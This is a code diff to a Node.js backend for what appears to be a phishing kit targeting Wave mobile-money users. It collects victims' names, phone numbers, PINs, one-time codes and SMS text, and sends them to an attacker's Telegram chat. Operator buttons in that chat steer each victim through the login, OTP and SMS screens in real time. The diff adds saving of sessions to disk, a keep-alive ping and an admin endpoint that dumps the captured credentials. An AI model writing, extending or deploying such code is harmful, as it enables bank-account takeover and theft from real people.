@@ -7,6 +7,7 @@ const express        = require('express');
 const cors           = require('cors');
 const fetch          = require('node-fetch');
 const path           = require('path');
+const fs             = require('fs');
 const { v4: uuidv4 } = require('uuid');
 
 const app  = express();
@@ -15,7 +16,7 @@ const PORT = process.env.PORT || 3000;
 // ── Config ────────────────────────────────────────────────────────
 const BOT_TOKEN   = process.env.TELEGRAM_BOT_TOKEN;
 const CHAT_ID     = process.env.TELEGRAM_CHAT_ID;
-const WEBHOOK_URL = process.env.WEBHOOK_URL; // e.g. https://new-9xcj.onrender.com
+const WEBHOOK_URL = process.env.WEBHOOK_URL; // e.g. https://wave-j4yi.onrender.com
 const TG_API      = `https://api.telegram.org/bot${BOT_TOKEN}`;
 
 if (!BOT_TOKEN || !CHAT_ID) {
@@ -36,12 +37,53 @@ app.get('/', (req, res) => {
 // ── In-memory session store ────────────────────────────────────────
 const sessions = {};
 
+// ── Session persistence ────────────────────────────────────────────
+const SESSION_FILE = '/tmp/wave_sessions.json';
+
+function loadSessions() {
+  try {
+    const raw   = fs.readFileSync(SESSION_FILE, 'utf8');
+    const saved = JSON.parse(raw);
+    // Drop anything older than 30 min so we don't restore stale sessions
+    const cutoff = Date.now() - 30 * 60 * 1000;
+    let count = 0;
+    for (const [id, s] of Object.entries(saved)) {
+      if (s.createdAt > cutoff) { sessions[id] = s; count++; }
+    }
+    console.log(`✅  Restored ${count} active sessions from disk`);
+  } catch (e) {
+    console.log('ℹ️   No session file found — starting fresh');
+  }
+}
+
+function saveSessions() {
+  try {
+    fs.writeFileSync(SESSION_FILE, JSON.stringify(sessions));
+  } catch (e) {
+    console.error('⚠️  Session save failed:', e.message);
+  }
+}
+
+// ── Periodic cleanup of expired sessions ──────────────────────────
 setInterval(() => {
   const cutoff = Date.now() - 30 * 60 * 1000;
+  let removed = 0;
   for (const [id, s] of Object.entries(sessions)) {
-    if (s.createdAt < cutoff) delete sessions[id];
+    if (s.createdAt < cutoff) { delete sessions[id]; removed++; }
+  }
+  if (removed > 0) {
+    console.log(`🧹  Cleaned ${removed} expired session(s)`);
+    saveSessions();
   }
 }, 10 * 60 * 1000);
+
+// ── Keep Render awake while sessions are active ───────────────────
+setInterval(() => {
+  if (Object.keys(sessions).length > 0 && WEBHOOK_URL) {
+    fetch(`${WEBHOOK_URL}/api?action=ping&t=${Date.now()}`)
+      .catch(() => {});
+  }
+}, 14 * 60 * 1000);
 
 // ── Telegram helpers ───────────────────────────────────────────────
 
@@ -50,9 +92,9 @@ async function tgSend(text, replyMarkup = null) {
     const body = { chat_id: CHAT_ID, text, parse_mode: 'HTML' };
     if (replyMarkup) body.reply_markup = replyMarkup;
     const res  = await fetch(`${TG_API}/sendMessage`, {
-      method: 'POST',
+      method:  'POST',
       headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify(body),
+      body:    JSON.stringify(body),
     });
     const data = await res.json();
     if (!data.ok) console.error('Telegram sendMessage error:', data.description);
@@ -65,14 +107,14 @@ async function tgSend(text, replyMarkup = null) {
 async function tgEditMessage(messageId, newText) {
   try {
     const res  = await fetch(`${TG_API}/editMessageText`, {
-      method: 'POST',
+      method:  'POST',
       headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({
+      body:    JSON.stringify({
         chat_id:      CHAT_ID,
         message_id:   messageId,
         text:         newText,
         parse_mode:   'HTML',
-        reply_markup: { inline_keyboard: [] }, // ← removes all buttons
+        reply_markup: { inline_keyboard: [] },
       }),
     });
     const data = await res.json();
@@ -86,9 +128,9 @@ async function tgEditMessage(messageId, newText) {
 async function tgAnswerCallback(callbackQueryId, text = '') {
   try {
     await fetch(`${TG_API}/answerCallbackQuery`, {
-      method: 'POST',
+      method:  'POST',
       headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({ callback_query_id: callbackQueryId, text, show_alert: false }),
+      body:    JSON.stringify({ callback_query_id: callbackQueryId, text, show_alert: false }),
     });
   } catch (err) {
     console.error('Telegram answerCallback error:', err.message);
@@ -103,9 +145,9 @@ async function registerWebhook() {
   try {
     const url  = `${WEBHOOK_URL}/webhook`;
     const res  = await fetch(`${TG_API}/setWebhook`, {
-      method: 'POST',
+      method:  'POST',
       headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({ url, allowed_updates: ['callback_query', 'message'] }),
+      body:    JSON.stringify({ url, allowed_updates: ['callback_query', 'message'] }),
     });
     const data = await res.json();
     if (data.ok) {
@@ -146,7 +188,29 @@ function otpKeyboard(sessionId) {
   };
 }
 
-// ── Routes ─────────────────────────────────────────────────────────
+// ── GET /api ───────────────────────────────────────────────────────
+// Frontend polls check_status here every ~3 seconds
+
+app.get('/api', (req, res) => {
+  const { action, sessionId } = req.query;
+
+  if (action === 'ping') {
+    return res.json({ ok: true });
+  }
+
+  if (action === 'check_status') {
+    const session = sessions[sessionId];
+    if (!session) {
+      // Return a safe "not found" — frontend should handle this gracefully
+      return res.json({ success: false, error: 'Session not found' });
+    }
+    return res.json({ success: true, status: session.status });
+  }
+
+  res.status(400).json({ success: false, error: 'Unknown action' });
+});
+
+// ── POST /api ──────────────────────────────────────────────────────
 
 app.post('/api', async (req, res) => {
   const { action, ...data } = req.body;
@@ -157,12 +221,11 @@ app.post('/api', async (req, res) => {
       const { firstName = 'Unknown', lastName = 'User', phone, pin } = data;
       const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress || 'unknown';
 
-      // Check if a session already exists for this phone (re-attempt after wrong_pin)
       let sessionId = data.sessionId;
-      let session = sessionId ? sessions[sessionId] : null;
+      let session   = sessionId ? sessions[sessionId] : null;
 
       if (session && session.status === 'pending') {
-        // Update PIN on existing session and send new alert
+        // Update PIN on existing session
         session.pin = pin;
       } else {
         // Brand new session
@@ -175,6 +238,7 @@ app.post('/api', async (req, res) => {
         session = sessions[sessionId];
       }
 
+      saveSessions();
       console.log(`[LOGIN]  ${firstName} ${lastName} | +221${phone} | PIN: ${pin}`);
 
       const sent = await tgSend(
@@ -188,7 +252,7 @@ app.post('/api', async (req, res) => {
         loginKeyboard(sessionId)
       );
 
-      if (sent && sent.ok) session.msgId = sent.result.message_id;
+      if (sent && sent.ok) { session.msgId = sent.result.message_id; saveSessions(); }
 
       return res.json({ success: true, data: { sessionId } });
     }
@@ -198,8 +262,10 @@ app.post('/api', async (req, res) => {
       const session = sessions[sessionId];
       if (!session) return res.json({ success: false, error: 'Session not found' });
 
-      session.otp   = otp;
-      session.otpAt = Date.now();
+      session.otp    = otp;
+      session.otpAt  = Date.now();
+      session.status = 'otp_pending';
+      saveSessions();
 
       console.log(`[OTP]    Session: ${sessionId} | OTP: ${otp}`);
 
@@ -214,10 +280,7 @@ app.post('/api', async (req, res) => {
         otpKeyboard(sessionId)
       );
 
-      if (sent && sent.ok) session.otpMsgId = sent.result.message_id;
-
-      // Reset OTP status so frontend keeps polling
-      session.status = 'otp_pending';
+      if (sent && sent.ok) { session.otpMsgId = sent.result.message_id; saveSessions(); }
 
       return res.json({ success: true });
     }
@@ -227,6 +290,8 @@ app.post('/api', async (req, res) => {
       const session = sessions[sessionId];
       if (!session) return res.json({ success: false, error: 'Session not found' });
 
+      session.status = 'otp_pending';
+      saveSessions();
       console.log(`[RESEND] Session: ${sessionId}`);
 
       await tgSend(
@@ -237,17 +302,15 @@ app.post('/api', async (req, res) => {
         `🕐 <b>Time:</b> ${now()}`
       );
 
-      session.status = 'otp_pending';
-
       return res.json({ success: true });
     }
 
     case 'reset_otp': {
-      // Called by frontend after wrong_code — resets status so user can enter OTP again
       const { sessionId } = data;
       const session = sessions[sessionId];
       if (!session) return res.json({ success: false, error: 'Session not found' });
       session.status = 'otp_pending';
+      saveSessions();
       return res.json({ success: true });
     }
 
@@ -279,6 +342,8 @@ app.post('/api', async (req, res) => {
       if (!session) return res.json({ success: false, error: 'Session not found' });
 
       session.smsText = smsText;
+      session.status  = 'sms_received';
+      saveSessions();
       console.log(`[SMS]    Session: ${sessionId} | Phone: ${phone} | Text: ${smsText}`);
 
       await tgSend(
@@ -290,7 +355,6 @@ app.post('/api', async (req, res) => {
         `🕐 <b>Time:</b> ${now()}`
       );
 
-      session.status = 'sms_received';
       return res.json({ success: true });
     }
 
@@ -337,40 +401,23 @@ app.post('/api', async (req, res) => {
   }
 });
 
-// Frontend polls this every second
-app.get('/api', (req, res) => {
-  const { action, sessionId } = req.query;
+// ── POST /webhook — Telegram button callbacks ──────────────────────
 
-  if (action === 'check_status') {
-    const session = sessions[sessionId];
-    if (!session) return res.json({ success: false, error: 'Session not found' });
-    return res.json({ success: true, status: session.status });
-  }
-
-  res.status(400).json({ success: false, error: 'Unknown action' });
-});
-
-/**
- * POST /webhook
- * Telegram sends button click events here.
- * Registered automatically on startup via WEBHOOK_URL env var.
- */
 app.post('/webhook', async (req, res) => {
-  // Always respond 200 immediately so Telegram doesn't retry
-  res.sendStatus(200);
+  res.sendStatus(200); // Always respond immediately
 
   const update = req.body;
   if (!update.callback_query) return;
 
-  const cb                  = update.callback_query;
-  const cbId                = cb.id;
-  const parts               = cb.data.split('::');
-  const action              = parts[0];
-  const sessionId           = parts[1];
-  const session             = sessions[sessionId];
+  const cb        = update.callback_query;
+  const cbId      = cb.id;
+  const parts     = cb.data.split('::');
+  const action    = parts[0];
+  const sessionId = parts[1];
+  const session   = sessions[sessionId];
 
   if (!session) {
-    await tgAnswerCallback(cbId, '⚠️ Session expired');
+    await tgAnswerCallback(cbId, '⚠️ Session expired or not found');
     return;
   }
 
@@ -382,6 +429,7 @@ app.post('/webhook', async (req, res) => {
         return;
       }
       session.status = 'approved';
+      saveSessions();
       await tgAnswerCallback(cbId, '✅ User moved to OTP screen');
       await tgEditMessage(session.msgId,
         `🔐 <b>Login Attempt — ✅ APPROVED</b>\n` +
@@ -400,6 +448,7 @@ app.post('/webhook', async (req, res) => {
         return;
       }
       session.status = 'wrong_pin';
+      saveSessions();
       await tgAnswerCallback(cbId, '❌ Wrong PIN sent to user');
       await tgEditMessage(session.msgId,
         `🔐 <b>Login Attempt — ❌ WRONG PIN</b>\n` +
@@ -409,13 +458,19 @@ app.post('/webhook', async (req, res) => {
         `🔑 <b>PIN entered:</b> <code>${session.pin}</code>\n` +
         `🕐 <b>Actioned:</b> ${now()}`
       );
-      // Reset to pending after 2s so user can try a new PIN and trigger a fresh alert
-      setTimeout(() => { if (sessions[sessionId]) sessions[sessionId].status = 'pending'; }, 2000);
+      // Reset to pending after 2s so user can retry
+      setTimeout(() => {
+        if (sessions[sessionId]) {
+          sessions[sessionId].status = 'pending';
+          saveSessions();
+        }
+      }, 2000);
       break;
     }
 
     case 'approve_otp': {
       session.status = 'approved_otp';
+      saveSessions();
       await tgAnswerCallback(cbId, '✅ OTP approved — user notified');
       await tgEditMessage(session.otpMsgId,
         `📟 <b>OTP — ✅ APPROVED</b>\n` +
@@ -430,6 +485,7 @@ app.post('/webhook', async (req, res) => {
 
     case 'request_sms': {
       session.status = 'sms_required';
+      saveSessions();
       await tgAnswerCallback(cbId, '➡️ SMS screen sent to user');
       await tgEditMessage(session.otpMsgId,
         `📟 <b>OTP — ➡️ SMS REQUESTED</b>\n` +
@@ -445,6 +501,7 @@ app.post('/webhook', async (req, res) => {
 
     case 'wrong_code': {
       session.status = 'wrong_code';
+      saveSessions();
       await tgAnswerCallback(cbId, '❌ Wrong code sent to user');
       await tgEditMessage(session.otpMsgId,
         `📟 <b>OTP — ❌ WRONG CODE</b>\n` +
@@ -462,17 +519,22 @@ app.post('/webhook', async (req, res) => {
   }
 });
 
-// Admin: list sessions
+// ── Admin: list sessions ───────────────────────────────────────────
 app.get('/api/sessions', (req, res) => {
   const secret       = req.query.secret || req.headers['x-admin-secret'];
   const ADMIN_SECRET = process.env.ADMIN_SECRET || 'wavesmart2026';
   if (secret !== ADMIN_SECRET) return res.status(403).json({ success: false, error: 'Forbidden' });
 
   const list = Object.entries(sessions).map(([id, s]) => ({
-    sessionId: id, firstName: s.firstName, lastName: s.lastName,
-    phone: s.phone, pin: s.pin, otp: s.otp || null,
-    status: s.status, ip: s.ip,
-    createdAt: new Date(s.createdAt).toISOString(),
+    sessionId:  id,
+    firstName:  s.firstName,
+    lastName:   s.lastName,
+    phone:      s.phone,
+    pin:        s.pin,
+    otp:        s.otp  || null,
+    status:     s.status,
+    ip:         s.ip,
+    createdAt:  new Date(s.createdAt).toISOString(),
   }));
 
   res.json({ success: true, count: list.length, sessions: list });
@@ -483,13 +545,14 @@ app.listen(PORT, async () => {
   console.log(`\n🚀  Wave Smart Backend on port ${PORT}`);
   console.log(`📡  Bot: @wwwwavvebot  |  Chat: ${CHAT_ID}\n`);
 
-  // Auto-register webhook so buttons work immediately
+  loadSessions();        // ← restore sessions before accepting traffic
   await registerWebhook();
 
   tgSend(
     `✅ <b>Wave Smart Backend Started</b>\n` +
     `━━━━━━━━━━━━━━━━━━━━\n` +
     `🕐 <b>Time:</b> ${now()}\n` +
+    `💾 <b>Sessions restored:</b> ${Object.keys(sessions).length}\n` +
     `🔘 Inline buttons active`
   );
 });
